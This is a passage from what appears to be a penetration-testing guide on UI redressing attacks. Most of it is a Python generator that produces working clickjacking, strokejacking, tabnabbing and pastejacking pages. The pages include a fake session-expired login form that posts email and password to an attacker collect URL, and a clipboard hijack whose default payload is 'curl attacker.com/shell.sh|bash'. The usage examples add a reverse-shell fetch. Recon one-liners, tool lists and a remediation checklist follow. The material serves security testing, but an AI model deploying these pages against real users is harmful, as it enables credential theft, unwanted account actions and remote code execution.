document.addEventListener('keydown',function(e){{
    var inp=document.querySelector('.input');
    if(e.key.length===1)inp.value+=e.key;
    else if(e.key==='Backspace')inp.value=inp.value.slice(0,-1);
}});
</script>
</body></html>""",

    "tabnab": """<!DOCTYPE html>
<html>
<head><title>{title}</title>
<style>
body {{ font-family:Georgia; max-width:800px; margin:0 auto; padding:40px;
       background:#fafafa; color:#333; }}
a {{ color:#1a73e8; }}
</style></head>
<body>
<h1>{heading}</h1>
<p>{subtext}</p>
<p>Read more: <a href="{external_url}" target="_blank" id="link">click here</a></p>
<script>
document.getElementById('link').addEventListener('click',function(){{
    setTimeout(function(){{
        document.title="{phish_title}";
        document.body.innerHTML=`
        <div style="max-width:400px;margin:80px auto;padding:30px;background:white;
                    border-radius:8px;box-shadow:0 1px 5px rgba(0,0,0,0.1);
                    font-family:Arial;">
            <h2 style="text-align:center;">Session Expired</h2>
            <p style="text-align:center;color:#666;">Please log in again</p>
            <form action="{collect_url}" method="POST">
                <input type="email" name="email" placeholder="Email"
                    style="width:100%;padding:10px;margin:8px 0;border:1px solid #ddd;
                           border-radius:4px;box-sizing:border-box;">
                <input type="password" name="password" placeholder="Password"
                    style="width:100%;padding:10px;margin:8px 0;border:1px solid #ddd;
                           border-radius:4px;box-sizing:border-box;">
                <button type="submit" style="width:100%;padding:10px;background:#4285f4;
                    color:white;border:none;border-radius:4px;cursor:pointer;margin-top:8px;">
                    Sign In</button>
            </form>
        </div>`;
        if(history.replaceState)history.replaceState({{}},'','/login');
    }},3000);
}});
</script>
</body></html>""",

    "pastejack": """<!DOCTYPE html>
<html>
<head><title>{title}</title>
<style>
body {{ background:#1e1e1e; color:#d4d4d4; font-family:Consolas,monospace; padding:40px;
       max-width:800px; margin:0 auto; }}
.code {{ background:#2d2d2d; border:1px solid #444; border-radius:6px; padding:15px 20px;
         margin:20px 0; }}
.code code {{ color:#9cdcfe; }}
h1 {{ color:#569cd6; }}
</style></head>
<body>
<h1>{heading}</h1>
<p>Copy and paste this command into your terminal:</p>
<div class="code"><code>{visible_cmd}</code></div>
<p style="color:#666;">📋 Select and copy the command above</p>
<script>
document.addEventListener('copy',function(e){{
    e.clipboardData.setData('text/plain','{malicious_cmd}\\n');
    e.preventDefault();
}});
</script>
</body></html>""",

    "dblclick": """<!DOCTYPE html>
<html>
<head><title>{title}</title>
<style>
body {{ background:#0f0f23; color:white; font-family:Arial; display:flex;
       justify-content:center; align-items:center; height:100vh; margin:0; }}
.box {{ background:#1a1a3e; padding:40px; border-radius:12px; text-align:center;
        width:400px; position:relative; }}
.btn {{ background:#4ecdc4; color:#111; border:none; padding:18px 50px; font-size:18px;
        border-radius:8px; cursor:pointer; font-weight:bold; }}
.wrap {{ position:relative; display:inline-block; }}
.mal {{ position:absolute; top:0; left:0; width:100%; height:100%; z-index:100;
        border:none; opacity:0; pointer-events:none; }}
</style></head>
<body>
<div class="box">
    <h2>{heading}</h2>
    <p style="color:#888;margin:20px 0;">{subtext}</p>
    <div class="wrap">
        <button class="btn" id="btn">{button_text}</button>
        <iframe class="mal" id="mal" src="{target_url}"></iframe>
    </div>
</div>
<script>
var c=0;
document.getElementById('btn').addEventListener('mousedown',function(){{
    c++;
    if(c===1){{
        this.textContent='Click again ✓';
        this.style.background='#238636';
        setTimeout(function(){{
            var m=document.getElementById('mal');
            m.style.opacity='0.0001';
            m.style.pointerEvents='auto';
        }},50);
    }}
}});
</script>
</body></html>"""
}

def generate(attack_type, args):
    tpl = TEMPLATES.get(attack_type)
    if not tpl:
        print(f"Unknown type: {attack_type}")
        return

    params = {
        "title": args.title or "Special Offer",
        "heading": args.heading or "Click Below",
        "subtext": args.subtext or "Complete this action to continue",
        "button_text": args.button or "Click Here",
        "target_url": html.escape(args.url),
        "opacity": str(args.opacity),
        "placeholder": args.placeholder or "Type here...",
        "external_url": args.external or "https://example.com",
        "phish_title": args.phish_title or "Login Required",
        "collect_url": args.collect or "https://attacker.com/collect",
        "visible_cmd": html.escape(args.visible_cmd or "sudo apt update"),
        "malicious_cmd": args.malicious_cmd or "curl attacker.com/shell.sh|bash",
    }

    output = tpl.format(**params)
    with open(args.output, 'w') as f:
        f.write(output)
    print(f"[+] {attack_type} PoC saved to {args.output}")
    print(f"[+] Serve: python3 -m http.server {args.port}")

if __name__ == "__main__":
    p = argparse.ArgumentParser(description="UI Redressing PoC Generator")
    p.add_argument("-t", "--type", required=True,
                   choices=["clickjack","strokejack","tabnab","pastejack","dblclick"])
    p.add_argument("-u", "--url", required=True, help="Target URL")
    p.add_argument("-o", "--output", default="poc.html")
    p.add_argument("--title", default=None)
    p.add_argument("--heading", default=None)
    p.add_argument("--subtext", default=None)
    p.add_argument("--button", default=None)
    p.add_argument("--opacity", type=float, default=0)
    p.add_argument("--placeholder", default=None)
    p.add_argument("--external", default=None)
    p.add_argument("--phish-title", default=None)
    p.add_argument("--collect", default=None)
    p.add_argument("--visible-cmd", default=None)
    p.add_argument("--malicious-cmd", default=None)
    p.add_argument("--port", type=int, default=8080)
    args = p.parse_args()
    generate(args.type, args)
```

```bash [Generator Usage]
# Clickjacking PoC
python3 ui_redress_poc_gen.py -t clickjack \
  -u "https://target.com/delete-account?confirm=1" \
  --title "Free Prize" \
  --heading "🎉 You Won!" \
  --button "Claim Prize" \
  -o clickjack.html

# Strokejacking PoC
python3 ui_redress_poc_gen.py -t strokejack \
  -u "https://target.com/settings/change-email" \
  --heading "🔍 Search" \
  --placeholder "Enter search query..." \
  -o strokejack.html

# Tabnabbing PoC
python3 ui_redress_poc_gen.py -t tabnab \
  -u "https://target.com" \
  --heading "Interesting Article" \
  --external "https://legitimate-news.com" \
  --collect "https://attacker.com/creds" \
  -o tabnab.html

# Pastejacking PoC
python3 ui_redress_poc_gen.py -t pastejack \
  -u "https://target.com" \
  --heading "Install Docker" \
  --visible-cmd "curl -fsSL https://get.docker.com | sh" \
  --malicious-cmd "curl attacker.com/rev.sh|bash" \
  -o pastejack.html

# Double Clickjacking PoC
python3 ui_redress_poc_gen.py -t dblclick \
  -u "https://target.com/oauth/authorize?client_id=attacker" \
  --heading "🤖 Verify You're Human" \
  --button "Double-Click to Verify" \
  -o dblclick.html

# Serve any PoC
python3 -m http.server 8080
```

---

## Testing Methodology

### Complete Reconnaissance Commands

```bash [Full Recon Workflow]
# 1. Enumerate all endpoints
gospider -s "https://target.com" -d 3 -c 10 -t 5 --sitemap --robots | tee spider.txt
hakrawler -url "https://target.com" -depth 3 | tee crawl.txt
katana -u "https://target.com" -d 3 -jc -kf -o katana.txt

# 2. Merge and deduplicate URLs
cat spider.txt crawl.txt katana.txt | grep "https://target.com" | sort -u > all_urls.txt

# 3. Check framing protection on all URLs
cat all_urls.txt | while read url; do
  xfo=$(curl -sI "$url" 2>/dev/null | grep -ci "x-frame-options")
  csp=$(curl -sI "$url" 2>/dev/null | grep -ci "frame-ancestors")
  if [ "$xfo" -eq 0 ] && [ "$csp" -eq 0 ]; then
    echo "[VULN] $url"
  fi
done | tee frameable_urls.txt

# 4. Filter for high-value targets (state-changing actions)
cat frameable_urls.txt | grep -iE "(delete|remove|update|change|transfer|authorize|approve|grant|confirm|settings|password|email|admin|oauth|consent|payment|checkout)" | tee high_value_targets.txt

# 5. Check for reverse tabnabbing
curl -s "https://target.com" | grep -oiP '<a[^>]+target\s*=\s*["\x27]_blank["\x27][^>]*>' | grep -viE 'noopener|noreferrer' | tee tabnab_vulns.txt

# 6. Check for pastejacking indicators
curl -s "https://target.com" | grep -iE "(addEventListener.*copy|oncopy|clipboardData)" | tee pastejack_indicators.txt

# 7. Check cookie security
curl -sI "https://target.com" | grep -i "set-cookie" | tee cookie_analysis.txt
```

### Iframe Loading Verification

```html [iframe_tester.html]
<!DOCTYPE html>
<html>
<head>
    <title>UI Redressing - Frame Test</title>
    <style>
        body { background: #111; color: white; font-family: monospace; padding: 20px; }
        .test { margin: 20px 0; padding: 15px; background: #1a1a1a; border-radius: 8px; }
        iframe { border: 2px solid #333; margin: 10px 0; }
        .status { padding: 5px 10px; border-radius: 4px; font-size: 12px; }
        .vuln { background: #2ea043; }
        .safe { background: #da3633; }
        .unknown { background: #d29922; }
    </style>
</head>
<body>
    <h1>🧪 UI Redressing Frame Tester</h1>
    <p>Enter target URL to test framing capability</p>
    <input type="text" id="urlInput" placeholder="https://target.com/page"
           style="width:80%; padding:10px; font-size:16px; background:#222;
                  color:white; border:1px solid #444; border-radius:4px;">
    <button onclick="testFrame()" style="padding:10px 20px; margin-left:10px;
            background:#238636; color:white; border:none; border-radius:4px;
            cursor:pointer;">Test</button>

    <div id="results"></div>

    <script>
        function testFrame() {
            const url = document.getElementById('urlInput').value;
            if (!url) return;

            const results = document.getElementById('results');
            const testDiv = document.createElement('div');
            testDiv.className = 'test';
            testDiv.innerHTML = `
                <h3>Testing: ${url}</h3>
                <p>Standard iframe:</p>
                <iframe src="${url}" width="800" height="200"
                    onload="this.nextElementSibling.innerHTML='<span class=\\'status vuln\\'>LOADED - Frameable</span>'"
                    onerror="this.nextElementSibling.innerHTML='<span class=\\'status safe\\'>BLOCKED</span>'">
                </iframe>
                <div><span class="status unknown">Loading...</span></div>

                <p>Sandbox iframe (JS disabled):</p>
                <iframe sandbox src="${url}" width="800" height="200"
                    onload="this.nextElementSibling.innerHTML='<span class=\\'status vuln\\'>LOADED with sandbox</span>'"
                    onerror="this.nextElementSibling.innerHTML='<span class=\\'status safe\\'>BLOCKED</span>'">
                </iframe>
                <div><span class="status unknown">Loading...</span></div>

                <p>Sandbox + allow-forms:</p>
                <iframe sandbox="allow-forms" src="${url}" width="800" height="200"
                    onload="this.nextElementSibling.innerHTML='<span class=\\'status vuln\\'>LOADED with sandbox=allow-forms</span>'"
                    onerror="this.nextElementSibling.innerHTML='<span class=\\'status safe\\'>BLOCKED</span>'">
                </iframe>
                <div><span class="status unknown">Loading...</span></div>
            `;
            results.prepend(testDiv);
        }
    </script>
</body>
</html>
```

---

## Tools & Resources

### Primary Tools

::field-group
  ::field{name="Burp Clickbandit" type="string"}
  Built-in Burp Suite tool for automatic clickjacking PoC generation. Navigate target in embedded browser, click the action, and it creates the exploit.
  `Burp > Menu > Burp Clickbandit`
  ::

  ::field{name="clickjacking-tool" type="string"}
  Automated clickjacking vulnerability scanner and PoC generator.
  `https://github.com/coffinxp/clickjacking-tool`
  ::

  ::field{name="Nuclei" type="string"}
  Template-based vulnerability scanner with clickjacking detection templates.
  `nuclei -tags clickjacking`
  ::

  ::field{name="PasteJacker" type="string"}
  Automated pastejacking attack tool with multiple payload templates.
  `https://github.com/D4Vinci/PasteJacker`
  ::

  ::field{name="Social Engineering Toolkit (SET)" type="string"}
  Comprehensive social engineering framework including tabnabbing and credential harvesting.
  `https://github.com/trustedsec/social-engineer-toolkit`
  ::

  ::field{name="BeEF (Browser Exploitation Framework)" type="string"}
  Browser exploitation framework with UI redressing modules including clickjacking, tabnabbing, and clipboard manipulation.
  `https://github.com/beefproject/beef`
  ::

  ::field{name="XSStrike" type="string"}
  Advanced XSS scanner that can help find injection points to chain with UI redressing.
  `https://github.com/s0md3v/XSStrike`
  ::
::

### References & Wordlists

::field-group
  ::field{name="OWASP Clickjacking" type="string"}
  `https://owasp.org/www-community/attacks/Clickjacking`
  ::

  ::field{name="OWASP Reverse Tabnabbing" type="string"}
  `https://owasp.org/www-community/attacks/Reverse_Tabnabbing`
  ::

  ::field{name="PortSwigger Clickjacking" type="string"}
  `https://portswigger.net/web-security/clickjacking`
  ::

  ::field{name="HackTricks UI Redressing" type="string"}
  `https://book.hacktricks.wiki/en/pentesting-web/clickjacking.html`
  ::

  ::field{name="PayloadsAllTheThings Clickjacking" type="string"}
  `https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Clickjacking`
  ::

  ::field{name="CWE-1021" type="string"}
  Improper Restriction of Rendered UI Layers or Frames.
  `https://cwe.mitre.org/data/definitions/1021.html`
  ::

  ::field{name="CWE-451" type="string"}
  User Interface (UI) Misrepresentation of Critical Information.
  `https://cwe.mitre.org/data/definitions/451.html`
  ::

  ::field{name="W3C UI Safety Mechanisms" type="string"}
  `https://www.w3.org/TR/UISafety/`
  ::
::

### Quick Reference Commands

```bash [One-Liners]
# Quick frameable check
curl -sI https://target.com | grep -ciE "x-frame-options|frame-ancestors" | xargs -I{} sh -c '[ {} -eq 0 ] && echo "FRAMEABLE" || echo "PROTECTED"'

# Mass scan from file
cat urls.txt | httpx -silent -include-response-header | grep -viE "x-frame-options|frame-ancestors" | cut -d' ' -f1 | tee frameable.txt

# Instant PoC server
echo '<iframe src="https://target.com" style="width:100%;height:100%;border:none;opacity:0.3;position:absolute;top:0;left:0;z-index:10;"></iframe><button style="padding:20px 50px;font-size:20px;position:relative;z-index:1;">Click Me</button>' > poc.html && python3 -m http.server 8080

# Find target=_blank without noopener
curl -s "https://target.com" | grep -oiP '<a[^>]+target="_blank"[^>]*>' | grep -v noopener

# Check all security headers at once
curl -sI "https://target.com" | grep -iE "^(x-frame|content-security|cross-origin|permissions-policy|referrer|strict-transport|x-content|x-xss|set-cookie)"

# Nuclei quick scan
echo "https://target.com" | nuclei -tags clickjacking -silent

# Wayback URLs for parameter discovery
waybackurls target.com | grep -iE "(delete|remove|update|change|authorize|approve|confirm)" | sort -u
```

---

## Methodology Checklist

::steps{level="4"}

#### Reconnaissance & Header Mapping

Enumerate all target endpoints using crawlers and spidering tools. Check every page for `X-Frame-Options`, `Content-Security-Policy frame-ancestors`, `Cross-Origin-Opener-Policy`, and `Permissions-Policy` headers. Test both authenticated and unauthenticated responses. Compare mobile vs desktop user-agent responses.

#### Cookie & Session Analysis

Analyze all session cookies for `SameSite`, `HttpOnly`, and `Secure` attributes. Determine which authentication mechanisms are in use. Test if cookies are transmitted within iframe contexts across different browsers. Document which attack types are feasible based on cookie policy.

#### Identify High-Value Targets

Map all state-changing actions: account deletion, email/password change, OAuth authorization, payment processing, admin actions, permission grants, social interactions. Prioritize endpoints that lack CSRF tokens alongside missing framing protections.

#### Test Clickjacking

Create basic iframe overlay PoC for each frameable high-value target. Test with opacity 0.3 for visual confirmation, then 0 for realistic attack. Verify the click lands on the intended target button. Test multi-step clickjacking for confirmation dialogs.

#### Test Strokejacking

Identify pages with sensitive input fields (email change, password reset, search with auto-complete). Create keystroke hijacking PoC with hidden iframe over visible input. Verify keystrokes are captured in the hidden iframe input.

#### Test Tabnabbing

Check all external links for missing `rel="noopener noreferrer"` on `target="_blank"` links. Create reverse tabnabbing PoC using `window.opener.location`. Test Visibility API-based tabnabbing for same-page attacks. Verify phishing page resembles the target login page.

#### Test Pastejacking

Identify pages with copyable code blocks, commands, or technical content. Create clipboard hijacking PoC that replaces copied text with malicious commands. Test across browsers (Chrome, Firefox, Safari) for clipboard API support.

#### Test Drag-and-Drop Redressing

Identify pages displaying sensitive tokens, CSRF values, or user data. Create drag-and-drop PoC that extracts data from hidden iframe through drag events. Test data injection via dragging into hidden iframe form fields.

#### Test Double Clickjacking & Permission Redressing

Create double-click PoC for OAuth consent screens and permission dialogs. Test browser permission hijacking for geolocation, camera, microphone, and notifications. Verify timing between clicks is exploitable across browsers.

#### Bypass Testing

Attempt sandbox attribute bypass for JavaScript frame-busting. Test double framing, navigation blocking, and history manipulation. Analyze CSP for wildcard subdomains or trusted domain compromise opportunities. Test ALLOW-FROM bypass in modern browsers.

#### Document & Report

Capture screenshots and screen recordings of each successful attack. Provide working PoC HTML files for each vulnerability. Detail exact user interaction required and realistic attack scenarios. Assess business impact for each attack type. Include remediation: `X-Frame-Options: DENY`, `CSP frame-ancestors 'none'`, `rel="noopener noreferrer"`, `SameSite=Strict`, anti-CSRF tokens, Permissions-Policy header.

::